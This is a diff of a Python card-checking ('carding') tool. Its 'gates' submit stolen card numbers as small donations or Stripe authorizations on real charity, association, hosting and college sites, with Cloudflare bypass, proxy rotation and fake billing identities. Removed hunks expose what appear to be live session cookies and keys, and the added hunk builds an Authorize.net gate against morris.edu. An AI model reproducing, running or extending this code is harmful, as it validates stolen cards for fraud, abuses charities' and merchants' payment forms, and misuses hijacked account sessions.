@@ -7,6 +7,7 @@ import uuid
 import json
 import cloudscraper
 import traceback
+import string
 from requests_toolbelt.multipart.encoder import MultipartEncoder
 from user_agent import generate_user_agent
 
@@ -19,9 +20,11 @@ def get_random_ua():
 
 def format_proxy(proxy):
     """Formats proxy string to dictionary for requests"""
-    if not proxy: return None
+    if not proxy:
+        return None
     try:
-        if "http" in proxy: return {"http": proxy, "https": proxy}
+        if "http" in proxy:
+            return {"http": proxy, "https": proxy}
         p = proxy.split(':')
         if len(p) == 4:
             url = f"http://{p[2]}:{p[3]}@{p[0]}:{p[1]}"
@@ -34,291 +37,8 @@ def format_proxy(proxy):
     return None
 
 # ============================================================================
-# 🚪 GATE 1: PayPal Commerce (Science)
-# 📄 Source: pp.py / pa.py
+# 🚪 GATE 1: PayPal Commerce (SFTS)
 # ============================================================================
-def check_paypal_science(cc, proxy=None):
-    """
-    Improved PayPal Commerce gate (GiveWP) – based on working script.
-    Uses atlanticcitytheatrecompany.com as the target site.
-    """
-    try:
-        # 1. Parse card
-        cc = cc.strip()
-        try:
-            n, mm, yy, cvc = cc.split('|')[0], cc.split('|')[1], cc.split('|')[2], cc.split('|')[3]
-            if len(yy) == 4: yy = yy[2:]
-        except:
-            return "❌ Format Error (Use cc|mm|yy|cvv)", "ERROR"
-
-        # 2. Setup session with cloudscraper (to bypass Cloudflare)
-        session = cloudscraper.create_scraper()
-
-        if proxy:
-            proxies_dict = format_proxy(proxy)   # call local function
-            if proxies_dict:
-                session.proxies.update(proxies_dict)
-
-        # Generate random user data (same as script)
-        first_names = ["James", "John", "Robert", "Michael", "William", "David", "Richard", "Joseph", "Thomas", "Charles"]
-        last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez"]
-        cities = ["New York", "Los Angeles", "Chicago", "Houston", "Phoenix", "Philadelphia", "San Antonio", "San Diego", "Dallas", "San Jose"]
-        states = ["AL", "AK", "AZ", "AR", "CA", "CO", "CT", "DE", "FL", "GA", "HI", "ID", "IL", "IN", "IA", "KS", "KY", "LA", "ME", "MD", "MA", "MI", "MN", "MS", "MO", "MT", "NE", "NV", "NH", "NJ", "NM", "NY", "NC", "ND", "OH", "OK", "OR", "PA", "RI", "SC", "SD", "TN", "TX", "UT", "VT", "VA", "WA", "WV", "WI", "WY"]
-        street_names = ["Main", "Oak", "Pine", "Maple", "Cedar", "Elm", "Washington", "Lake", "Hill", "Park"]
-        first_name = random.choice(first_names)
-        last_name = random.choice(last_names)
-        email = f"{first_name.lower()}{last_name.lower()}{random.randint(100,999)}@gmail.com"
-        phone = f"{random.randint(200,999)}{random.randint(200,999)}{random.randint(1000,9999)}"
-        street_number = random.randint(100, 9999)
-        street_name = random.choice(street_names)
-        street_type = random.choice(["St", "Ave", "Blvd", "Rd", "Ln"])
-        street_address1 = f"{street_number} {street_name} {street_type}"
-        street_address2 = f"{random.choice(['Apt', 'Unit', 'Suite'])} {random.randint(1,999)}"
-        city = random.choice(cities)
-        state_abbr = random.choice(states)
-        zip_code = f"{random.randint(10000,99999)}"
-        amount = "5.00"  # $5 donation
-
-        # 3. Load donation page to get tokens
-        headers = {
-            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
-        }
-        r = session.get('https://atlanticcitytheatrecompany.com/donations/donate/', headers=headers, timeout=20)
-
-        # Extract required tokens
-        ssa = re.search(r'name="give-form-hash" value="(.*?)"', r.text).group(1)
-        ssa00 = re.search(r'name="give-form-id-prefix" value="(.*?)"', r.text).group(1)
-        ss000a00 = re.search(r'name="give-form-id" value="(.*?)"', r.text).group(1)
-
-        enc = re.search(r'"data-client-token":"(.*?)"', r.text).group(1)
-        dec = base64.b64decode(enc).decode('utf-8')
-        au = re.search(r'"accessToken":"(.*?)"', dec).group(1)
-
-        # 4. First AJAX – process donation (sets up order)
-        headers_ajax = {
-            'authority': 'atlanticcitytheatrecompany.com',
-            'accept': '*/*',
-            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-            'origin': 'https://atlanticcitytheatrecompany.com',
-            'referer': 'https://atlanticcitytheatrecompany.com/donations/donate/',
-            'user-agent': headers['User-Agent'],
-            'x-requested-with': 'XMLHttpRequest',
-        }
-        data = {
-            'give-honeypot': '',
-            'give-form-id-prefix': ssa00,
-            'give-form-id': ss000a00,
-            'give-form-title': '',
-            'give-current-url': 'https://atlanticcitytheatrecompany.com/donations/donate/',
-            'give-form-url': 'https://atlanticcitytheatrecompany.com/donations/donate/',
-            'give-form-minimum': amount,
-            'give-form-maximum': '999999.99',
-            'give-form-hash': ssa,
-            'give-price-id': 'custom',
-            'give-amount': amount,
-            'give_stripe_payment_method': '',
-            'payment-mode': 'paypal-commerce',
-            'give_first': first_name,
-            'give_last': last_name,
-            'give_email': email,
-            'give_comment': '',
-            'card_name': f"{first_name} {last_name}",
-            'card_exp_month': '',
-            'card_exp_year': '',
-            'billing_country': 'US',
-            'card_address': street_address1,
-            'card_address_2': street_address2,
-            'card_city': city,
-            'card_state': state_abbr,
-            'card_zip': zip_code,
-            'give_action': 'purchase',
-            'give-gateway': 'paypal-commerce',
-            'action': 'give_process_donation',
-            'give_ajax': 'true',
-        }
-        r2 = session.post('https://atlanticcitytheatrecompany.com/wp-admin/admin-ajax.php', headers=headers_ajax, data=data, timeout=20)
-
-        # 5. Second AJAX – create PayPal order (multipart)
-        multipart_data = MultipartEncoder({
-            'give-honeypot': (None, ''),
-            'give-form-id-prefix': (None, ssa00),
-            'give-form-id': (None, ss000a00),
-            'give-form-title': (None, ''),
-            'give-current-url': (None, 'https://atlanticcitytheatrecompany.com/donations/donate/'),
-            'give-form-url': (None, 'https://atlanticcitytheatrecompany.com/donations/donate/'),
-            'give-form-minimum': (None, amount),
-            'give-form-maximum': (None, '999999.99'),
-            'give-form-hash': (None, ssa),
-            'give-price-id': (None, 'custom'),
-            'give-amount': (None, amount),
-            'give_stripe_payment_method': (None, ''),
-            'payment-mode': (None, 'paypal-commerce'),
-            'give_first': (None, first_name),
-            'give_last': (None, last_name),
-            'give_email': (None, email),
-            'give_comment': (None, ''),
-            'card_name': (None, f"{first_name} {last_name}"),
-            'card_exp_month': (None, ''),
-            'card_exp_year': (None, ''),
-            'billing_country': (None, 'US'),
-            'card_address': (None, street_address1),
-            'card_address_2': (None, street_address2),
-            'card_city': (None, city),
-            'card_state': (None, state_abbr),
-            'card_zip': (None, zip_code),
-            'give-gateway': (None, 'paypal-commerce'),
-        })
-
-        headers_multipart = {
-            'authority': 'atlanticcitytheatrecompany.com',
-            'accept': '*/*',
-            'content-type': multipart_data.content_type,
-            'origin': 'https://atlanticcitytheatrecompany.com',
-            'referer': 'https://atlanticcitytheatrecompany.com/donations/donate/',
-            'user-agent': headers['User-Agent'],
-        }
-        params = {'action': 'give_paypal_commerce_create_order'}
-        r3 = session.post('https://atlanticcitytheatrecompany.com/wp-admin/admin-ajax.php', params=params, headers=headers_multipart, data=multipart_data, timeout=20)
-        order_id = r3.json()['data']['id']
-
-        # 6. Confirm payment source with PayPal
-        headers_paypal = {
-            'authority': 'cors.api.paypal.com',
-            'accept': '*/*',
-            'authorization': f'Bearer {au}',
-            'content-type': 'application/json',
-            'origin': 'https://assets.braintreegateway.com',
-            'referer': 'https://assets.braintreegateway.com/',
-            'user-agent': headers['User-Agent'],
-        }
-        json_payload = {
-            'payment_source': {
-                'card': {
-                    'number': n,
-                    'expiry': f'20{yy}-{mm}',
-                    'security_code': cvc,
-                    'attributes': {'verification': {'method': 'SCA_WHEN_REQUIRED'}}
-                }
-            },
-            'application_context': {'vault': False}
-        }
-        r4 = session.post(f'https://cors.api.paypal.com/v2/checkout/orders/{order_id}/confirm-payment-source', headers=headers_paypal, json=json_payload, timeout=20)
-
-        # 7. Final AJAX – approve order (multipart again)
-        multipart_data2 = MultipartEncoder({
-            'give-honeypot': (None, ''),
-            'give-form-id-prefix': (None, ssa00),
-            'give-form-id': (None, ss000a00),
-            'give-form-title': (None, ''),
-            'give-current-url': (None, 'https://atlanticcitytheatrecompany.com/donations/donate/'),
-            'give-form-url': (None, 'https://atlanticcitytheatrecompany.com/donations/donate/'),
-            'give-form-minimum': (None, amount),
-            'give-form-maximum': (None, '999999.99'),
-            'give-form-hash': (None, ssa),
-            'give-price-id': (None, 'custom'),
-            'give-amount': (None, amount),
-            'give_stripe_payment_method': (None, ''),
-            'payment-mode': (None, 'paypal-commerce'),
-            'give_first': (None, first_name),
-            'give_last': (None, last_name),
-            'give_email': (None, email),
-            'give_comment': (None, ''),
-            'card_name': (None, f"{first_name} {last_name}"),
-            'card_exp_month': (None, ''),
-            'card_exp_year': (None, ''),
-            'billing_country': (None, 'US'),
-            'card_address': (None, street_address1),
-            'card_address_2': (None, street_address2),
-            'card_city': (None, city),
-            'card_state': (None, state_abbr),
-            'card_zip': (None, zip_code),
-            'give-gateway': (None, 'paypal-commerce'),
-        })
-
-        headers_multipart2 = {
-            'authority': 'atlanticcitytheatrecompany.com',
-            'accept': '*/*',
-            'content-type': multipart_data2.content_type,
-            'origin': 'https://atlanticcitytheatrecompany.com',
-            'referer': 'https://atlanticcitytheatrecompany.com/donations/donate/',
-            'user-agent': headers['User-Agent'],
-        }
-        params2 = {'action': 'give_paypal_commerce_approve_order', 'order': order_id}
-        r5 = session.post('https://atlanticcitytheatrecompany.com/wp-admin/admin-ajax.php', params=params2, headers=headers_multipart2, data=multipart_data2, timeout=20)
-
-        text = r5.text
-
-        # 8. Parse response
-        if 'true' in text:
-            return f"Thank You For Your Donation (${amount})", "APPROVED"
-        elif 'DO_NOT_HONOR' in text:
-            return "Do Not Honor", "DECLINED"
-        elif 'ACCOUNT_CLOSED' in text or 'PAYER_ACCOUNT_LOCKED_OR_CLOSED' in text:
-            return "Account Closed", "DECLINED"
-        elif 'LOST_OR_STOLEN' in text:
-            return "Lost or Stolen", "DECLINED"
-        elif 'CVV2_FAILURE' in text:
-            return "CCN Live (CVV Failed)", "APPROVED"
-        elif 'SUSPECTED_FRAUD' in text:
-            return "Suspected Fraud", "DECLINED"
-        elif 'INVALID_ACCOUNT' in text:
-            return "Invalid Account", "DECLINED"
-        elif 'REATTEMPT_NOT_PERMITTED' in text:
-            return "Reattempt Not Permitted", "DECLINED"
-        elif 'ACCOUNT_BLOCKED_BY_ISSUER' in text:
-            return "Account Blocked", "DECLINED"
-        elif 'ORDER_NOT_APPROVED' in text:
-            return "Order Not Approved", "DECLINED"
-        elif 'PICKUP_CARD_SPECIAL_CONDITIONS' in text:
-            return "Pickup Card", "DECLINED"
-        elif 'PAYER_CANNOT_PAY' in text:
-            return "Payer Cannot Pay", "DECLINED"
-        elif 'INSUFFICIENT_FUNDS' in text:
-            return "Insufficient Funds", "APPROVED"
-        elif 'GENERIC_DECLINE' in text:
-            return "Generic Decline", "DECLINED"
-        elif 'COMPLIANCE_VIOLATION' in text:
-            return "Compliance Violation", "DECLINED"
-        elif 'TRANSACTION_NOT_PERMITTED' in text:
-            return "Transaction Not Permitted", "DECLINED"
-        elif 'PAYMENT_DENIED' in text:
-            return "Payment Denied", "DECLINED"
-        elif 'INVALID_TRANSACTION' in text:
-            return "Invalid Transaction", "DECLINED"
-        elif 'RESTRICTED_OR_INACTIVE_ACCOUNT' in text:
-            return "Restricted/Inactive Account", "DECLINED"
-        elif 'SECURITY_VIOLATION' in text:
-            return "Security Violation", "DECLINED"
-        elif 'DECLINED_DUE_TO_UPDATED_ACCOUNT' in text:
-            return "Declined – Updated Account", "DECLINED"
-        elif 'INVALID_OR_RESTRICTED_CARD' in text:
-            return "Invalid or Restricted Card", "DECLINED"
-        elif 'EXPIRED_CARD' in text:
-            return "Expired Card", "DECLINED"
-        elif 'CRYPTOGRAPHIC_FAILURE' in text:
-            return "Cryptographic Failure", "DECLINED"
-        elif 'TRANSACTION_CANNOT_BE_COMPLETED' in text:
-            return "Cannot Complete", "DECLINED"
-        elif 'DECLINED_PLEASE_RETRY' in text:
-            return "Declined – Retry Later", "DECLINED"
-        elif 'TX_ATTEMPTS_EXCEED_LIMIT' in text:
-            return "Exceeded Limit", "DECLINED"
-        else:
-            try:
-                err = r5.json()['data']['error']
-                return f"Declined: {err}", "DECLINED"
-            except:
-                return "Unknown Error", "ERROR"
-
-    except Exception as e:
-        print(f"❌ PayPal Science error: {traceback.format_exc()}")
-        return f"Process Error: {str(e)}", "ERROR"
-
-# ============================================================================
-# 🚪 GATE 2: PayPal Commerce (SFTS)
-# 📄 Source: paypalcvv.py
-# ============================================================================
-
 def check_paypal_sfts(cc, proxy=None):
     try:
         # 1. Parse Card
@@ -525,274 +245,389 @@ def check_paypal_sfts(cc, proxy=None):
         return f"Process Error: {str(e)}", "ERROR"
 
 # ============================================================================
-# 🚪 GATE 3: Stripe Auth (Associations)
-# 📄 Source: checker.py
+# 🚪 GATE 2: Morris.edu Authorize.net
 # ============================================================================
-
-ACCOUNT_POOL = [
-    {
-        'name': 'Xray Xlea',
-        'cookies': {
-            '_ga': 'GA1.2.493930677.1768140612',
-            '__stripe_mid': '66285028-f520-443b-9655-daf7134b8b855e5f16',
-            'wordpress_logged_in_9f53720c758e9816a2dcc8ca08e321a9': 'xrayxlea%7C1769350388%7CxGcUPPOJgEHPSWiTK6F9YZpA6v4AgHki1B2Hxp0Zah5%7C3b8f3e6911e25ea6cccc48a4a0be35ed25e0479c9e90ccd2f16aa41cac04277d',
-            'wfwaf-authcookie-69aad1faf32f3793e60643cdfdc85e58': '7670%7Cother%7Cread%7Cb723e85c048d2147e793e6640d861ae4f4fddd513abc1315f99355cf7d2bc455',
-            '__cf_bm': 'rd1MFUeDPNtBzTZMChisPSRIJpZKLlo5dgif0o.e_Xw-1769258154-1.0.1.1-zhaKFI8L0JrFcuTzj.N9OkQvBuz6HvNmFFKCSqfn_gE2EF3GD65KuZoLGPuEhRyVwkKakMr_mcjUehEY1mO9Kb9PKq1x5XN41eXwXQavNyk',
-            '__stripe_sid': '4f84200c-3b60-4204-bbe8-adc3286adebca426c8',
-        }
-    },
-    {
-        'name': 'Yasin Akbulut',
-        'cookies': {
-            '__cf_bm': 'zMehglRiFuX3lzj170gpYo3waDHipSMK0DXxfB63wlk-1769340288-1.0.1.1-ppt5LELQNDnJzFl1hN13LWwuQx5ZFdMS9b0SP4A3j7kasxaqEBMgSJ3vu9AbzyFOlbCozpAr.hE.g3xFpU_juaLp1heupyxmSrmte1Gn7g0',
-            'wordpress_logged_in_9f53720c758e9816a2dcc8ca08e321a9': 'akbulutyasin836%7C1770549977%7CwdF5vz1qFXPSxofozNx9OwxFdmIoSdQKxaHlkOkjL2o%7C4d5f40c1bf01e0ccd6a59fdf08eb8f5aeb609c05d4d19fe41419a82433ffc1fa',
-            '__stripe_mid': '2d2e501a-542d-4635-98ec-e9b2ebe26b4c9ac02a',
-            '__stripe_sid': 'b2c6855b-7d29-4675-8fe4-b5c4797045132b8dea',
-            'wfwaf-authcookie-69aad1faf32f3793e60643cdfdc85e58': '8214%7Cother%7Cread%7Cde5fd05c6afc735d5df323de21ff23f598bb5e1893cb9a7de451b7a8d50dc782',
-        }
-    },
-    {
-        'name': 'Mehmet Demir',
-        'cookies': {
-            '__cf_bm': 'zMehglRiFuX3lzj170gpYo3waDHipSMK0DXxfB63wlk-1769340288-1.0.1.1-ppt5LELQNDnJzFl1hN13LWwuQx5ZFdMS9b0SP4A3j7kasxaqEBMgSJ3vu9AbzyFOlbCozpAr.hE.g3xFpU_juaLp1heupyxmSrmte1Gn7g0',
-            'wordpress_logged_in_9f53720c758e9816a2dcc8ca08e321a9': 'akbulutyasin836%7C1770549977%7CwdF5vz1qFXPSxofozNx9OwxFdmIoSdQKxaHlkOkjL2o%7C4d5f40c1bf01e0ccd6a59fdf08eb8f5aeb609c05d4d19fe41419a82433ffc1fa',
-            '__stripe_mid': '2d2e501a-542d-4635-98ec-e9b2ebe26b4c9ac02a',
-            '__stripe_sid': 'b2c6855b-7d29-4675-8fe4-b5c4797045132b8dea',
-            'sbjs_migrations': '1418474375998%3D1',
-        }
-    },
-    {
-        'name': 'Ahmet Aksoy',
-        'cookies': {
-            '__cf_bm': 'aidh4Te7pipYMK.tLzhoGhXGelOgYCnYQJ525DEIqNM-1769341631-1.0.1.1-HSRHKAbOct2k1bbWIIdIN7b5fzWFydAtRqz2W0pAdRXrbVusNthJCJvU5fc7d3RkZEOZ5ZXZghJ4J2jmYzIcdJGDbb90txn4HPgSKJ6neA8',
-            '_ga': 'GA1.2.1596026899.1769341671',
-            '_gid': 'GA1.2.776441.1769341671',
-            '__stripe_mid': '1b0100cd-503c-4665-b43b-3f5eb8b4edcdaae8bd',
-            '__stripe_sid': '0f1ce17f-f7a9-4d26-bd37-52d402d30d1a8716bf',
-            'wordpress_logged_in_9f53720c758e9816a2dcc8ca08e321a9': 'ahmetaksoy2345%7C1770551236%7CGF3svY4oh1UiTMXJ9iUXXuXtimHSG6PHiW0Sm5wrDbt%7Ce810ede4e1743cd73dc8dacdd56598ecf4ceaa383052d9b50d1bbd6c02da7237',
-            'wfwaf-authcookie-69aad1faf32f3793e60643cdfdc85e58': '8216%7Cother%7Cread%7C70f37e1a77141c049acd75715a8d1aef6d47b285656c907c79392a55e787d97e',
-        }
-    },
-    {
-        'name': 'Dlallah',
-        'cookies': {
-            '__cf_bm': 'nwW.aCdcJXW8SAKZYpmEuqU6gCsNM1ibgP9mNKqXuYw-1769341811-1.0.1.1-hkeF4QihuQfbJD7DRqQcILcMycgxTqxxHcqwsU6oR8WsdViGcVMbX0CHqmx76N8wUEuIQwLFooNTm2gjGrRCKlURh4vf1ghD3gkz18KjyWg',
-            '__stripe_mid': 'c7368749-b4fc-4876-bb97-bc07cc8a36b5851848',
-            '__stripe_sid': 'b9d4dfb2-bba4-4ee6-9c72-8acf6acfe138efd65d',
-            '_ga': 'GA1.2.1162515809.1769341851',
-            'wordpress_logged_in_9f53720c758e9816a2dcc8ca08e321a9': 'dlallah%7C1770551422%7CiMfIpOcXTEo2Y9rmVMf3Mpf0kpkC4An81IgT0ZfMLff%7C01fbc5549954aa84d4f1b6c62bc44ebe65df58be0b82014d1b246c220d361231',
-            'wfwaf-authcookie-69aad1faf32f3793e60643cdfdc85e58': '8217%7Cother%7Cread%7C24531823e5d32b0ad918bef860997fced3f0b92cce7ba200e3a753e050b546d3',
-        }
-    }
-]
-
-ULTRA_HEADERS = {
-    'authority': 'associationsmanagement.com',
-    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
-    'accept-language': 'en-US,en;q=0.9',
-    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
-    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
-    'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-platform': '"Android"',
-}
-
-def check_stripe_associations(cc, proxy=None):
+def check_morris_authnet(cc, proxy=None):
+    """
+    Attempts a $1 donation on morris.edu using Authorize.net.
+    Returns (message, status)
+    """
     try:
-        # 1. Parse Card
         cc = cc.strip()
-        n, mm, yy, cvc = cc.split('|')
-        yy = f"20{yy[-2:]}" if len(yy) <= 2 else yy
-        
-        # 2. Select Account and Setup Scraper
-        acc = random.choice(ACCOUNT_POOL)
-        scraper = cloudscraper.create_scraper(browser={'browser': 'chrome', 'platform': 'android', 'mobile': True})
-        
-        if proxy:
-            p_dict = format_proxy(proxy)
-            scraper.proxies.update(p_dict)
-        
-        scraper.cookies.update(acc['cookies'])
-        scraper.headers.update(ULTRA_HEADERS)
-
-        # 1. Page Connect
-        r_page = scraper.get("https://associationsmanagement.com/my-account/add-payment-method/", timeout=25)
-        pk_live = re.search(r'pk_live_[a-zA-Z0-9]+', r_page.text).group(0)
-        addnonce = re.search(r'"createAndConfirmSetupIntentNonce":"([a-z0-9]+)"', r_page.text).group(1)
-
-        time.sleep(random.uniform(2.5, 3.5))
-
-        stripe_hd = {
-            'authority': 'api.stripe.com',
-            'accept': 'application/json',
-            'content-type': 'application/x-www-form-urlencoded',
-            'origin': 'https://js.stripe.com',
-            'referer': 'https://js.stripe.com/',
-            'user-agent': ULTRA_HEADERS['user-agent'],
-        }
-
-        stripe_payload = (
-            f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_year]={yy}&card[exp_month]={mm}'
-            f'&billing_details[name]={acc["name"].replace(" ", "+")}'
-            f'&billing_details[address][postal_code]=10001'
-            f'&key={pk_live}'
-            f'&muid={acc["cookies"].get("__stripe_mid", str(uuid.uuid4()))}'
-            f'&sid={acc["cookies"].get("__stripe_sid", str(uuid.uuid4()))}'
-            f'&guid={str(uuid.uuid4())}'
-            f'&payment_user_agent=stripe.js%2F8f77e26090%3B+stripe-js-v3%2F8f77e26090%3B+checkout'
-            f'&time_on_page={random.randint(90000, 150000)}'
-        )
-
-        r_stripe_req = scraper.post('https://api.stripe.com/v1/payment_methods', headers=stripe_hd, data=stripe_payload)
-        r_stripe = r_stripe_req.json()
-
-        if 'id' not in r_stripe:
-            err = r_stripe.get('error', {}).get('message', 'Radar Security Block')
-            return f"Declined -> {err}", "DECLINED"
-            
-        # 3. Final Ajax
-        ajax_data = {
-            'action': 'wc_stripe_create_and_confirm_setup_intent',
-            'wc-stripe-payment-method': r_stripe['id'],
-            'wc-stripe-payment-type': 'card',
-            '_ajax_nonce': addnonce,
-        }
-        r_ajax = scraper.post('https://associationsmanagement.com/wp-admin/admin-ajax.php', data=ajax_data, timeout=20).text
-        text = r_ajax.lower()
-
-        # 6. Final Logic from checker.py
-        if '"success":true' in text: return "Approved (Auth)", "APPROVED"
-        if 'insufficient_funds' in text: return "Insufficient Funds", "APPROVED"
-        if 'incorrect_cvc' in text: return "CCN Live (CVC Incorrect)", "APPROVED"
-        if 'security code' in text: return "CCN Live (Security Code)", "APPROVED"
-        
-        # Parse Decline Reason
-        reason = re.search(r'message\\":\\"(.*?)\\"', r_ajax)
-        reason_txt = reason.group(1) if reason else 'Rejected'
-        return f"❌ Declined ({reason_txt})", "DECLINED"
-        
-    except requests.exceptions.Timeout:
-        return "⏱️ Timeout (proxy/site slow)", "ERROR"
-    except requests.exceptions.ProxyError:
-        return "🔌 Proxy Dead", "ERROR"
-    except AttributeError as e:
-        return f"🚫 Site Changed (check cookies) - {str(e)[:50]}", "ERROR"
-    except Exception as e:
-        # Catch-all for ANY crash
-        error_trace = traceback.format_exc()
-        print(f"❌ CRITICAL ERROR [{cc}]:\n{error_trace}")
-        return f"💥 System Error: {str(e)[:80]}", "ERROR"
-
-# ============================================================================
-# 🚪 GATE 4: HostArmada (Stripe)
-# 📄 Source: $tripeauth.py
-# ============================================================================
-
-def check_stripe_hostarmada(cc, proxy=None):
-    try:
-        # 1. Parse Card
-        cc = cc.strip()
-        n, mm, yy, cvc = cc.split('|')[0], cc.split('|')[1], cc.split('|')[2], cc.split('|')[3]
-        if len(yy) == 2: yy = "20" + yy
+        parts = cc.split('|')
+        if len(parts) != 4:
+            return "Invalid card format", "ERROR"
+        n, mm, yy, cvc = parts
+        if len(yy) == 2:
+            yy = '20' + yy
 
         session = requests.Session()
-        session.proxies = format_proxy(proxy)
-        
-        cookies = {
-            'WHMCSy551iLvnhYt7': '8ca8a4c665c9ec28eab1f8221ad4101d',
-            '_fbp': 'fb.1.1769757795735.772366065144413707',
-            '__zlcmid': '1VroFkzAJVG59We',
-            '__stripe_mid': '5330d896-1e8d-4606-a930-c28209c4f3e148b5e0',
-            '__stripe_sid': '8fc0309c-0967-4bc6-b6ad-962a97b2ff618f802f',
-            'ph_phc_V4kxp7RWacpQcqkBu4PN1BicIOKeaoGNi9dRyIo0IEm_posthog': '%7B%22%24device_id%22%3A%22019c0dc8-e4b9-7bdc-9a0e-9c1e067e64c5%22%2C%22distinct_id%22%3A%22019c0dc8-e4b9-7bdc-9a0e-9c1e067e64c5%22%2C%22%24sesid%22%3A%5B1769758005700%2C%22019c0dc8-e4d0-74c1-b7c1-be1502450835%22%2C1769757795531%5D%2C%22%24initial_person_info%22%3A%7B%22r%22%3A%22%24direct%22%2C%22u%22%3A%22https%3A%2F%2Fmy.hostarmada.com%2Fclientarea.php%22%7D%7D',
+        if proxy:
+            session.proxies = format_proxy(proxy)
+
+        # 1. Get donation page to extract client key
+        headers1 = {
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'Accept-Language': 'en-US,en;q=0.9,ar;q=0.8',
+            'Cache-Control': 'max-age=0',
+            'Referer': 'https://www.google.com/',
+            'User-Agent': get_random_ua(),
+            'Upgrade-Insecure-Requests': '1',
         }
+        r1 = session.get('https://www.morris.edu/donate-now', headers=headers1, timeout=20)
+        if r1.status_code != 200:
+            return f"Initial page failed: {r1.status_code}", "ERROR"
 
-        headers = {
-            'authority': 'api.stripe.com',
-            'accept': 'application/json',
-            'accept-language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
-            'content-type': 'application/x-www-form-urlencoded',
-            'origin': 'https://js.stripe.com',
-            'referer': 'https://js.stripe.com/',
-            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
-            'sec-ch-ua-mobile': '?1',
-            'sec-ch-ua-platform': '"Android"',
-            'sec-fetch-dest': 'empty',
-            'sec-fetch-mode': 'cors',
-            'sec-fetch-site': 'same-site',
-            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
-        }
+        cl_match = re.search(r'"ClientKey":"(.*?)"', r1.text)
+        if not cl_match:
+            return "ClientKey not found", "ERROR"
+        cl = cl_match.group(1)
 
-        # 2. Create Payment Method (Stripe API)
-        data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=b7547fec-aaeb-43cf-86ac-2d11a91f66ed6e4605&muid=5330d896-1e8d-4606-a930-c28209c4f3e148b5e0&sid=8fc0309c-0967-4bc6-b6ad-962a97b2ff618f802f&pasted_fields=number&payment_user_agent=stripe.js%2Fa10732936b%3B+stripe-js-v3%2Fa10732936b%3B+split-card-element&referrer=https%3A%2F%2Fmy.hostarmada.com&time_on_page=31195&key=pk_live_sZwZsvPzNPvgqldQYmY5QWhE00B8Wlf3Tx'
-        
-        r1 = session.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data, timeout=15)
-        
-        try:
-            id_tok = r1.json()['id']
-        except:
-            return "❌ Token Error", "ERROR"
-
-        # 3. HostArmada Checkout
+        # 2. Get payment token from Authorize.net
         headers2 = {
-            'authority': 'my.hostarmada.com',
-            'accept': 'application/json, text/javascript, */*; q=0.01',
-            'accept-language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
-            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-            'origin': 'https://my.hostarmada.com',
-            'referer': 'https://my.hostarmada.com/cart.php?a=checkout',
-            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
-            'sec-ch-ua-mobile': '?1',
-            'sec-ch-ua-platform': '"Android"',
-            'sec-fetch-dest': 'empty',
-            'sec-fetch-mode': 'cors',
-            'sec-fetch-site': 'same-origin',
-            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
-            'x-requested-with': 'XMLHttpRequest',
+            'Accept': '*/*',
+            'Accept-Language': 'en-US,en;q=0.9,ar;q=0.8',
+            'Content-Type': 'application/json; charset=UTF-8',
+            'Origin': 'https://www.morris.edu',
+            'Referer': 'https://www.morris.edu/',
+            'User-Agent': get_random_ua(),
         }
-        data2 = {
-            'token': '5657f42085350cb956addb77da8cea663100c2ab',
-            'submit': 'true',
-            'custtype': 'new',
-            'loginemail': '',
-            'loginpassword': '',
-            'firstname': 'Tommy',
-            'lastname': 'K2itm',
-            'email': 'Tommy@gmail.com',
-            'phonenumber': '315401313',
-            'password': 'Pedro1234',
-            'password2': 'Pedro1234',
-            'country': 'US',
-            'state': 'New York',
-            'address1': '402 California Avenue',
-            'address2': 'suite 2910',
-            'city': 'Bakersfield',
-            'companyname': 'Enzo',
-            'postcode': '10080',
-            'paymentmethod': 'stripe',
-            'accordion-2': 'on',
-            'ccinfo': 'new',
-            'validatepromo': '0',
-            'promocode': '',
-            'accepttos': 'on',
-            'payment_method_id': id_tok,   # fixed variable name
+        payload2 = {
+            'securePaymentContainerRequest': {
+                'merchantAuthentication': {
+                    'name': '32rW7qTZdf',
+                    'clientKey': cl,
+                },
+                'data': {
+                    'type': 'TOKEN',
+                    'id': 'a155e32b-390f-e237-0f13-d2d6b6a7811c',
+                    'token': {
+                        'cardNumber': n,
+                        'expirationDate': f'{mm}{yy[-2:]}',  # MMYY
+                    },
+                },
+            },
         }
+        r2 = session.post('https://api2.authorize.net/xml/v1/request.api', headers=headers2, json=payload2, timeout=20)
+        if r2.status_code != 200:
+            return f"Authorize.net token error: {r2.status_code}", "ERROR"
+        data_value = re.search(r'"dataValue":"(.*?)"', r2.text)
+        if not data_value:
+            return "No dataValue in response", "ERROR"
+        token = data_value.group(1)
 
-        r2 = session.post('https://my.hostarmada.com/index.php?rp=/stripe/payment/intent', 
-                          cookies=cookies, headers=headers2, data=data2, timeout=30)
-        
-        result = r2.json()
-        
-        # 4. Result Logic from $tripeauth.py
-        if 'warning' in result:
-            warning = result['warning']
-            if "Insufficient" in warning: return "Insufficient Funds", "APPROVED"
